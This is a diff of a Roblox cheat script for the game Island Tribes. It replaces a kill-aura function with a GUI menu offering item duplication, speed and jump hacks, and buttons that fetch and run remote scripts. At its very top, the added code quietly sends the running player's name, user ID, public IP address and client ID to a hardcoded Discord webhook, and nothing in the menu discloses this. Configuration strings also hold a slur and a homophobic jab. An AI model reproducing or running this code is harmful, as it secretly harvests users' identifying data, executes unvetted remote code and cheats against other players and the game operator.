@@ -1,46 +1,555 @@
-function KillAura()
-    while getgenv().configs.KillAura do
-        if getgenv().configs.KillAura then
-            task.wait()
-            local function GetClosestKAPlayer()
-                local range = 32
-                local closest
-                for _, plr in pairs(Players:GetPlayers()) do
-                    if plr ~= LocalPlayer then
-                        if not table.find(Whitelist_table, plr.Name) then
-                            if IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
-                                local char = plr.Character
-                                if char:FindFirstChild("PlayerBillboard") and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title') and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon') then
-                                    if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 == Color3.fromRGB(80, 63, 47) then
-                                        local mypos = LocalPlayer.Character.HumanoidRootPart.Position
-                                        local plrpos = plr.Character.HumanoidRootPart.Position
-                                        local dist = (mypos - plrpos).magnitude
-                                        if dist < range then
-                                            range = dist
-                                            closest = plr.Character
-                                        end
-                                    else
-                                        if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 ~= LocalPlayer.Character:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 then
-                                            local mypos = LocalPlayer.Character.HumanoidRootPart.Position
-                                            local plrpos = plr.Character.HumanoidRootPart.Position
-                                            local dist = (mypos - plrpos).magnitude
-                                            if dist < range then
-                                                range = dist
-                                                closest = plr.Character
-                                            end
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-                return closest
-            end
-            local NearestPlayer = GetClosestKAPlayer()
-            if NearestPlayer then
-                RemoteEvents['ToolAction']:FireServer(NearestPlayer)
-            end
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+ 
+HttpService = game:GetService("HttpService")
+Webhook_URL =  "https://discord.com/api/webhooks/1353966655990140968/qd0Hl1CCg5nwKKGY3YH_wzryIEuyBFajw_rm2n6KpfoqVSTZbRLkJq1k9F8-tWoLD7np"
+ 
+local request = syn and syn.request or request or http and http.request or http_request
+ 
+local response = request({
+    Url = Webhook_URL,
+    Method = "POST",
+    Headers = {
+        ['Content-Type'] = 'application/json'
+    },
+    Body = HttpService:JSONEncode({
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["title"] = "",
+                ["description"] = game.Players.LocalPlayer.Name .." Logged into Islandtribes With the keyv2 Script",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xffffff),
+                ["fields"] = {
+                    {
+                        ["name"] = "Player Name : ",
+                        ["value"] = game.Players.LocalPlayer.Name,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "UserId : ",
+                        ["value"] = game.Players.LocalPlayer.UserId,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "User Profile : ",
+                        ["value"] = "https://www.roblox.com/users/" ..
+                            game.Players.LocalPlayer.UserId,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "IP: ",
+                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "Client Id : ",
+                        ["value"] = game:GetService("RbxAnalyticsService")
+                            :GetClientId(),
+                        ["inline"] = true
+                    }
+                }
+            }
+        }
+    })
+})
+
+local Window = Rayfield:CreateWindow({
+    Name = "                                Island Tribes 🌴",
+    LoadingTitle = "WSP",
+    LoadingSubtitle = "Made by Chungdz credit to Friend",
+    ConfigurationSaving = {
+       Enabled = flase,
+       FolderName = nil, 
+       FileName = "Nigga 69"
+    },
+
+    KeySystem = true,
+    KeySettings = {
+       Title = "Island Tribes 🌴",
+       Subtitle = "Made by Chung credit #Chungdz",
+       Note = "this guy is gay gbaox_01",
+       FileName = "0", 
+       SaveKey = true,
+       GrabKeyFromSite = true,
+       Key = {"https://raw.githubusercontent.com/Chungdz09/Script-chung-dz/refs/heads/main/Key"}
+    }
+ })
+
+ local MainTab = Window:CreateTab("🏠 Main", nil) 
+ local MainSection = MainTab:CreateSection("Other Scripts")
+
+local Button = MainTab:CreateButton({
+   Name = "Ctrl + click TP",
+   Callback = function()
+    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Click%20Teleport.txt"))()  
+  end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Infinite yield",
+   Callback = function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()  
+  end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Dark Dex",
+   Callback = function()
+    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
+  end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "ESP",
+   Callback = function()
+    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/WRD%20ESP.txt"))()
+   end,
+})
+
+local MainSection = MainTab:CreateSection("Toggles")
+
+local Toggle = MainTab:CreateToggle({
+   Name = "Toggle Inf Jump",
+   CurrentValue = false,
+   Flag = "Toggle1", 
+   Callback = function(Value)
+   loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Jump.txt"))()
+   end,
+})
+
+local MainSection = MainTab:CreateSection("Sliders")
+
+local Slider = MainTab:CreateSlider({
+   Name = "WalkSpeed Slider",
+   Range = {1, 350},
+   Increment = 1,
+   Suffix = "Speed",
+   CurrentValue = 16,
+   Flag = "sliderws", 
+   Callback = function(Value)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
+   end,
+})
+
+local Slider = MainTab:CreateSlider({
+   Name = "JumpPower Slider",
+   Range = {1, 350},
+   Increment = 1,
+   Suffix = "Speed",
+   CurrentValue = 16,
+   Flag = "sliderjp",
+   Callback = function(Value)
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
+   end,
+})
+    
+local Tab2 = Window:CreateTab("🤑 Duping", nil)
+local Section = Tab2:CreateSection("Start Duping items") 
+
+
+local Button = Tab2:CreateButton({
+    Name = "🏁Start Dupe",
+    Callback = function()
+        getgenv().olddata = game:GetService("ReplicatedStorage").References.Comm.Events.SetSettings
+        game:GetService("ReplicatedStorage").References.Comm.Events.SetSettings:FireServer(getgenv().olddata)    
+    end,
+ })
+
+local Section = Tab2:CreateSection("Armors") 
+
+local Button = Tab2:CreateButton({
+   Name = "🌋Dupe Obsidian Armor",
+   Callback = function()
+      local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+      local putIn = true
+      local itemIDs = {225,226,227,228,235}
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+  
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(chest, putIn, itemID)
+      end
+ end,
+})
+ 
+ local Button = Tab2:CreateButton({
+    Name = "🦴Soul Duping",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+        local putIn = true
+        local itemIDs = {204, 202, 201, 203, 218, 216}
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
         end
-    end
-end
+    end,
+ })
+ 
+local Section = Tab2:CreateSection("Packs") 
+
+ local Button = Tab2:CreateButton({
+    Name = "📦Chest pack 25x",
+    Callback = function()
+      local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+      local putIn = true
+      local itemIDs = {382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 
+      382, 382, 382,}
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+  
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(chest, putIn, itemID)
+      end
+  end,
+})
+ 
+local Button = Tab2:CreateButton({
+   Name = "🍭Candypack 500x 😊",
+   Callback = function()
+     local localChest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+     local putIn = true
+     local itemIDs = {}
+      
+      for i = 1, 500 do
+          table.insert(itemIDs, 188)
+      end
+      
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+      
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(localChest, putIn, itemID)
+      end
+ end,
+})
+
+ local Button = Tab2:CreateButton({
+    Name = "🍉Fruit pack 25x",
+    Callback = function()
+      local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+      local putIn = true
+      local itemIDs = {325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325,}
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+  
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(chest, putIn, itemID)
+      end
+  end,
+})
+
+ local Button = Tab2:CreateButton({
+    Name = "🛡️Prot. pack 25x",
+    Callback = function()
+      local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+      local putIn = true
+      local itemIDs = {317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317, 317,}
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+  
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(chest, putIn, itemID)
+      end
+  end,
+})
+
+ local Button = Tab2:CreateButton({
+    Name = "🤺Warr. pack 25x",
+    Callback = function()
+      local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+      local putIn = true
+      local itemIDs = {318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318, 318,}
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+  
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(chest, putIn, itemID)
+      end
+  end,
+})
+
+ local Button = Tab2:CreateButton({
+    Name = "🪓Fresh pack 25x",
+    Callback = function()
+      local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+      local putIn = true
+      local itemIDs = {111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111, 111,}
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+  
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(chest, putIn, itemID)
+      end
+  end,
+})
+
+ local Button = Tab2:CreateButton({
+    Name = "Stone pack 25x",
+    Callback = function()
+      local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+      local putIn = true
+      local itemIDs = {112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, 112, }
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+  
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(chest, putIn, itemID)
+      end
+  end,
+})
+
+local Tab3 = Window:CreateTab("😵‍💫 Crazy Dupe", nil)
+local Section = Tab3:CreateSection("Gliders 🪁")
+
+
+ local Button = Tab3:CreateButton({
+    Name = "🪁Easter Glider🪁",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+        local putIn = true
+        local itemIDs = {272}
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
+        end
+    end,
+ })
+
+ local Button = Tab3:CreateButton({
+    Name = "🪁Glider🪁",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+        local putIn = true
+        local itemIDs = {301}
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
+        end
+    end,
+ })
+
+local Section = Tab3:CreateSection("Others")
+
+ local Button = Tab3:CreateButton({
+    Name = "🌀Portal Book",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+        local putIn = true
+        local itemIDs = {313}
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
+        end
+    end,
+ })
+
+ local Button = Tab3:CreateButton({
+    Name = "🛡️Deflect Book",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+        local putIn = true
+        local itemIDs = {323}
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
+        end
+    end,
+ })
+
+
+ local Button = Tab3:CreateButton({
+    Name = "🥶Freezio Book",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+        local putIn = true
+        local itemIDs = {310}
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
+        end
+    end,
+ })
+
+ local Button = Tab3:CreateButton({
+    Name = "💀Oofio Book",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+        local putIn = true
+        local itemIDs = {309} 
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
+        end
+    end,
+ })
+
+ local Button = Tab3:CreateButton({
+    Name = "🎃Pumpkin Shield🎃",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
+        local putIn = true
+        local itemIDs = {379}
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
+        end
+    end,
+ })
+
+local Tab4 = Window:CreateTab("📦Moonstone Chest input", nil)
+local Section = Tab4:CreateSection("Put your items into a Moonstone Chest")
+
+local Section = Tab4:CreateSection("Packs")
+
+ local Button = Tab4:CreateButton({
+    Name = "📦Chestpack 25x",
+    Callback = function()
+      local chest = game:GetService("Workspace").Replicators.NonPassive["Moonstone Storage Chest"]
+      local putIn = true
+      local itemIDs = {382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 382, 
+      382, 382, 382,}
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+  
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(chest, putIn, itemID)
+      end
+  end,
+})
+ 
+local Button = Tab4:CreateButton({
+   Name = "🍭Candypack 500x",
+   Callback = function()
+     local localChest = game:GetService("Workspace").Replicators.NonPassive["Moonstone Storage Chest"]
+     local putIn = true
+     local itemIDs = {}
+      
+      for i = 1, 250 do
+          table.insert(itemIDs, 188)
+      end
+      
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+      
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(localChest, putIn, itemID)
+      end
+ end,
+})
+
+local Button = Tab4:CreateButton({
+    Name = "Fruit pack 25x",
+    Callback = function()
+      local chest = game:GetService("Workspace").Replicators.NonPassive["Moonstone Storage Chest"]
+      local putIn = true
+      local itemIDs = {325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325,}
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+  
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(chest, putIn, itemID)
+      end
+  end,
+})
+
+local Section = Tab4:CreateSection("Glider")
+
+ local Button = Tab4:CreateButton({
+    Name = "🪁Easter Glider🪁",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Moonstone Storage Chest"]
+        local putIn = true
+        local itemIDs = {272}
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
+        end
+    end,
+ })
+
+ local Button = Tab4:CreateButton({
+    Name = "🪁Glider🪁",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Moonstone Storage Chest"]
+        local putIn = true
+        local itemIDs = {301}
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
+        end
+    end,
+ })
+
+local Section = Tab4:CreateSection("Other")
+
+ local Button = Tab4:CreateButton({
+    Name = "🎃Pumpkin Shield 10x🎃",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Moonstone Storage Chest"]
+        local putIn = true
+        local itemIDs = {379, 379, 379, 379, 379, 379, 379, 379, 379, 379}
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
+        end
+    end,
+ })
+
+local Section = Tab4:CreateSection("Armors") 
+
+local Button = Tab4:CreateButton({
+   Name = "🌋Dupe Obsidian Armor",
+   Callback = function()
+      local chest = game:GetService("Workspace").Replicators.NonPassive["Moonstone Storage Chest"]
+      local putIn = true
+      local itemIDs = {225,226,227,228,235,293,230}
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+  
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(chest, putIn, itemID)
+      end
+ end,
+})
+
+local Button = Tab4:CreateButton({
+    Name = "🦴Soul Duping",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Moonstone Storage Chest"]
+        local putIn = true
+        local itemIDs = {204, 202, 201, 203, 218, 216}
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
+        end
+    end,
+ })
+
+local Button = Tab4:CreateButton({
+    Name = "Moon Duping",
+    Callback = function()
+        local chest = game:GetService("Workspace").Replicators.NonPassive["Moonstone Storage Chest"]
+        local putIn = true
+        local itemIDs = {369, 366, 365, 364, 363, 370,199,222}
+        local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+    
+        for _, itemID in ipairs(itemIDs) do
+            Event:FireServer(chest, putIn, itemID)
+        end
+    end,
+ })
+
+local Button = Tab4:CreateButton({
+   Name = "Easter Candy",
+   Callback = function()
+     local localChest = game:GetService("Workspace").Replicators.NonPassive["Moonstone Storage Chest"]
+     local putIn = true
+     local itemIDs = {}
+      
+      for i = 1, 250 do
+          table.insert(itemIDs, 271)
+      end
+      
+      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
+      
+      for _, itemID in ipairs(itemIDs) do
+          Event:FireServer(localChest, putIn, itemID)
+      end
+ end,
+})
